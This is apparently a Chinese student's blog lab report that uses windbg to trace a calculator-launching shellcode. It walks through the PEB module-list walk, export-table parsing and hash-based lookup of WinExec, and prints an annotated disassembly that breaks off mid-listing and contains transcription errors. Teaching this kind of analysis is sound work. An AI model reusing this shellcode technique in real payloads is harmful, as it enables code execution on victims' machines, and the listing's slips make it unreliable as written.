@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="实验目标掌握shellcode在漏洞利用中的基本用法及编码方法。 实验内容要求 根据实验软件SCer.exe和shellcode 代码sc1.bin，通过windbg逆向分析弹出计算器的漏洞利用详细过程，形成实验报告提交； 根据实验题目sc2，撰写详细的解题过程，至少包括漏洞成因分析、漏洞利用思路阐述，最终形成实验报告提交；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞分析技术实验一">
+<meta property="og:url" content="https://leeyuxun.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="实验目标掌握shellcode在漏洞利用中的基本用法及编码方法。 实验内容要求 根据实验软件SCer.exe和shellcode 代码sc1.bin，通过windbg逆向分析弹出计算器的漏洞利用详细过程，形成实验报告提交； 根据实验题目sc2，撰写详细的解题过程，至少包括漏洞成因分析、漏洞利用思路阐述，最终形成实验报告提交；">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694705353.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694728011.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694910561.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695122571.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695714811.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570696124449.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720367525.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720397247.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720439856.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720495667.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720534446.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720591411.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720625434.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720888291.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570722168233.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723107241.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723521474.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723747826.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723703471.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724269799.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724951706.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725038291.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725066226.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725199028.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771191258.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773348206.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771333009.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771446664.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771910484.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771986846.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772442097.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772516947.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772640877.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773507362.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570774960954.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570784221146.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570786458697.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868262705.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570863363546.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570808000533.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570869598910.png">
+<meta property="article:published_time" content="2019-10-12T08:55:23.000Z">
+<meta property="article:modified_time" content="2020-04-02T06:30:46.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694705353.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>漏洞分析技术实验一 | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          漏洞分析技术实验一
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-12 16:55:23" itemprop="dateCreated datePublished" datetime="2019-10-12T16:55:23+08:00">2019-10-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-02 14:30:46" itemprop="dateModified" datetime="2020-04-02T14:30:46+08:00">2020-04-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">软件安全实验</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>掌握shellcode在漏洞利用中的基本用法及编码方法。</p>
+<h1 id="实验内容要求"><a href="#实验内容要求" class="headerlink" title="实验内容要求"></a>实验内容要求</h1><ol>
+<li>根据实验软件SCer.exe和shellcode 代码sc1.bin，通过windbg逆向分析弹出计算器的漏洞利用详细过程，形成实验报告提交；</li>
+<li>根据实验题目sc2，撰写详细的解题过程，至少包括漏洞成因分析、漏洞利用思路阐述，最终形成实验报告提交；<span id="more"></span></li>
+</ol>
+<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="分析sc1-bin弹出计算器的漏洞利用详细过程"><a href="#分析sc1-bin弹出计算器的漏洞利用详细过程" class="headerlink" title="分析sc1.bin弹出计算器的漏洞利用详细过程"></a>分析sc1.bin弹出计算器的漏洞利用详细过程</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
+<li>操作系统：Windows XP Professional Service Pack 3</li>
+<li>工具：windbg、Scer.exe、Notepad++</li>
+</ul>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li><p>使用SCer.exe测试sc1.bin文件，成功弹出计算器，说明shellcode可以运行；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694705353.png" alt="1570694705353"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694728011.png" alt="1570694728011"></p>
+</li>
+<li><p>用scer.exe先把cs1.bin文件转为字符串sc1.bin.sc文件，在最前面加上<code>0xCC</code>。在汇编中<code>0xCC</code>对应的汇编指令为<code>int 3</code>，该指令是系统的中断指令，可以理解为在 windbg中提前设置好了一个断点；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694910561.png" alt="1570694910561"></p>
+</li>
+<li><p>再使用Scer.exe将更改后得sc1.bin.sc文件转换成可执行得bin文件sc1.bin.sc.mybin；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695122571.png" alt="1570695122571"></p>
+</li>
+<li><p>打开windbg，依次选择<code>File</code>、<code>Open Executable Files</code>、<code>Scer.exe</code>，使用windbg调试Scer.exe，选择<code>Debug</code>、<code>Go</code>，弹出Scer.exe的界面；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695714811.png" alt="1570695714811"></p>
+</li>
+<li><p>将sc1.bin.sc.mybin文件拖入Scer.exe输入框，点击执行shellcode，运行至设置的<code>0XCC</code>断点处，根据断点，得到shellcode汇编代码如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570696124449.png" alt="1570696124449"></p>
+</li>
+<li><p>开始调试shellcode</p>
+<ol>
+<li><p>先跳转至<code>0x00b40057</code>处；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720367525.png" alt="1570720367525"></p>
+</li>
+<li><p>将地址<code>0x69cc4e7h</code>压入栈中；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720397247.png" alt="1570720397247"></p>
+</li>
+<li><p>调用地址<code>0x00b40003</code>；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720439856.png" alt="1570720439856"></p>
+</li>
+<li><p>将esi置空；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720495667.png" alt="1570720495667"></p>
+</li>
+<li><p>fs寄存器指向TEB结构，TEB结构地址偏移<code>0x30</code>指向PEB结构，即将PEB结构的地址赋给esi；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720534446.png" alt="1570720534446"></p>
+<p>其中PEB结构如下；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR InheritedAddressSpace; <span class="comment">// 00h</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions; <span class="comment">// 01h</span></span><br><span class="line">    UCHAR BeingDebugged; <span class="comment">// 02h</span></span><br><span class="line">    UCHAR Spare; <span class="comment">// 03h</span></span><br><span class="line">    PVOID Mutant; <span class="comment">// 04h</span></span><br><span class="line">    PVOID ImageBaseAddress; <span class="comment">// 08h</span></span><br><span class="line">    PPEB_LDR_DATA Ldr; <span class="comment">// 0Ch</span></span><br><span class="line">    …………</span><br><span class="line">&#125;PEB,*PPEB</span><br></pre></td></tr></table></figure></li>
+<li><p>利用PEB结构偏移<code>0x0C</code>找到<code>PPEB_LDR_DATA Ldr</code>；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720591411.png" alt="1570720591411"></p>
+<p>其中_PEB_LDR_DATA结构如下；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length; <span class="comment">// +0x00</span></span><br><span class="line">    BOOLEAN Initialized; <span class="comment">// +0x04</span></span><br><span class="line">    PVOID SsHandle; <span class="comment">// +0x08</span></span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x0c</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x14</span></span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;<span class="comment">// +0x1c</span></span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; <span class="comment">// +0x24</span></span><br></pre></td></tr></table></figure></li>
+<li><p>利用<code>PPEB_LDR_DATA Ldr</code>偏移<code>0x1C</code>找到<code>LIST_ENTRY InInitializationOrderModuleList</code>，它是指向<code>LDR_MODULE</code>链表结构中，相应的双向链表头部的指针；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720625434.png" alt="1570720625434"></p>
+</li>
+<li><p>该动态链表按顺序存放着PE装入运行时初始化模块的信息第一个链表节点是ntdll.dll，第二个链表结点就是kernel32.dll，因此偏移<code>0x08</code>处为ntdll.dll地址，即ebp偏移<code>0x08</code>后指向ntdll.dll；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720888291.png" alt="1570720888291"></p>
+</li>
+<li><p>将esi指向的内存的地址处的数据赋值给esi，即将链表下一节点放入esi；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570722168233.png" alt="1570722168233"></p>
+</li>
+<li><p>从ntdll.dll加载基址算起，偏移<code>0x3c</code>的地方就是其PE文件头，PE头偏移<code>0x78</code>的地方存放着指向函数导出表的指针，连续两次运算，使得ebx的值为<code>0x00003400</code>；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723107241.png" alt="1570723107241"></p>
+</li>
+<li><p>由于ebx的值为<code>0x00003400</code>，<code>test ebx,ebp</code>结果不改变FLAG寄存器的状态，故不会进行下一步的跳转；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723521474.png" alt="1570723521474"></p>
+</li>
+<li><p>将输出表地址存入ebx中；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723747826.png" alt="1570723747826"></p>
+</li>
+<li><p>根据表的结构，在偏移地址<code>0x18</code>处存储着函数数目，把表里的函数数目放入ecx中；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723703471.png" alt="1570723703471"></p>
+</li>
+<li><p><code>jcxz</code>即<code>jump if cx equals zero</code>，当<code>ecx=0</code>时跳转到<code>0x00b4000f</code>，此时ecx不为0，故不进行跳转；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724269799.png" alt="1570724269799"></p>
+</li>
+<li><p>导出表偏移<code>0x20</code>处的指针指向存储导出函数函数名的列表，将列表中第一个函数的地址赋给edi；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724951706.png" alt="1570724951706"></p>
+</li>
+<li><p>将列表中最后一个函数的地址赋值给edi；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725038291.png" alt="1570725038291"></p>
+</li>
+<li><p>将eax置空，用作索引；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725066226.png" alt="1570725066226"></p>
+</li>
+<li><p>把edx的每一位变为eax的最高位，再把edx扩展为eax的高位，即变为64位；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725199028.png" alt="1570725199028"></p>
+</li>
+<li><p>接下来几步构成了一个循环，相当于对函数名进行了一个处理，包括使得ebp中存储的地址变为kernel32.dll的地址；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771191258.png" alt="1570771191258"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773348206.png" alt="1570773348206"></p>
+</li>
+<li><p>执行到cmp ，把值和栈顶+4处，一开始入栈的值比较，一开始入栈的其实是winexc经过处理得到的值，对比不相等就再次进行循环，跳到loopne换下一个函数名；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771333009.png" alt="1570771333009"></p>
+</li>
+<li><p>经过多次循环没找到就会跳回<code>0x00b4000f</code>，换一个dll继续寻找；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771446664.png" alt="1570771446664"></p>
+</li>
+<li><p>先将数组赋值给edx，存储函数序号，再加上edp，得到函数名称列表地址，再加上<code>ecx*2</code>,得到目标函数序号；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771910484.png" alt="1570771910484"></p>
+</li>
+<li><p>将edi指向一个RVA数组，再加上ebp存储的kernel32.dll的基地址，得到导出函数地址；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771986846.png" alt="1570771986846"></p>
+</li>
+<li><p>计算出最终的目标地址；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772442097.png" alt="1570772442097"></p>
+</li>
+<li><p>使用<code>ret</code>指令返回；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772516947.png" alt="1570772516947"></p>
+</li>
+<li><p>进行一系列的函数压栈、弹栈操作；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772640877.png" alt="1570772640877"></p>
+</li>
+<li><p>调用ebp存储的地址<code>0x7c8623ad</code>上存储的<code>winExec</code>函数；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773507362.png" alt="1570773507362"></p>
+</li>
+<li><p>在进入<code>winExec</code>函数后，执行与上述寻找winexc类似的操作，这里不在叙述，直至找到调用计算器函数<code>calc</code>并执行弹出计算器；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570774960954.png" alt="1570774960954"></p>
+</li>
+</ol>
+</li>
+<li><p>shellcode的汇编代码及备注如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">jmp		00b40057</span><br><span class="line">xor		esi,esi						//将esi置空</span><br><span class="line">mov		esi,dword ptr fs:[esi+30h]	//将PEB结构的地址赋给esi</span><br><span class="line">mov		esi,dword ptr [esi+0Ch]		//将PPEB_LDR_DATA Ldr结构的地址赋给esi</span><br><span class="line">mov		esi,dword ptr [esi+1Ch]		//将LDR_MODULE链表地址赋给esi</span><br><span class="line">mov		ebp,dword ptr [esi+8]		//将ntdll.dll地址赋给ebp</span><br><span class="line">mov		esi,dword ptr [esi]			//将链表下一节点放入esi</span><br><span class="line">mov		ebx,dword ptr [ebp+3Ch]		//接下来两步将PE头存放着指向函数导出表的指针赋给ebx</span><br><span class="line">mov		ebx,dword ptr [ebp+ebx+78h]</span><br><span class="line">test	ebx,ebx</span><br><span class="line">je		00b400f</span><br><span class="line">add		ebp,ebp						//将输出表地址存入ebx中</span><br><span class="line">mov		ecx,dword ptr [ebx+18h]		//表里的函数数目放入ecx</span><br><span class="line">jcxz	00b400f</span><br><span class="line">mov		edi,dword ptr [ebx+20h]		//将列表中第一个函数的地址赋给edi</span><br><span class="line">add		edi,ebp</span><br><span class="line">mov		edi,dword ptr [edi+ecx*4-4]	//将列表中最后一个函数的地址赋给edi</span><br><span class="line">add		edi,ebp</span><br><span class="line">xor		eax,eax						//将eax置空，用作索引</span><br><span class="line">cdq									//把edx的每一位变为eax的最高位，再把edx扩展为eax的高位，即变为64位</span><br><span class="line">add		dl,byte ptr [edi]			//接下来几步构成了一个循环，相当于对函数名进行了一个处理</span><br><span class="line">ror		edx,4</span><br><span class="line">scas	byte ptr es:[edi]</span><br><span class="line">jne		00b40035</span><br><span class="line">cmp		edx,dword ptr [edi+4]		//把值和栈顶+4处，一开始入栈的值比较，一开始入栈的其实是winexc经过处理得到的值，对比不相等就再次进行循环，跳到loopne换下一个函数名</span><br><span class="line">loopne	00b40027</span><br><span class="line">jne		00b4000f</span><br><span class="line">mov		edx,dword ptr [ebx+24h]		//先将数组赋值给edx，存储函数序号，再加上edp，得到函数名称列表地址，再加上ecx*2,得到目标函数序号</span><br><span class="line">add		edx,edp</span><br><span class="line">movzx	edx,word ptr [edx+ecx*2]</span><br><span class="line">mov		edi,dword ptr [ebx+1Ch]		//将edi指向一个RVA数组，再加上ebp存储的kernel32.dll的基地址，得到导出函数地址</span><br><span class="line">add		edi,ebp</span><br><span class="line">add		ebp,dword ptr [edi+edx*4]	//计算出最终的目标地址</span><br><span class="line">ret									//使用ret返回指令</span><br><span class="line">push	69CCC4E7h					//进行一系列的函数压栈、弹栈操作</span><br><span class="line">call	00b40003</span><br><span class="line">push	eax</span><br><span class="line">push	636C6163h</span><br><span class="line">mov		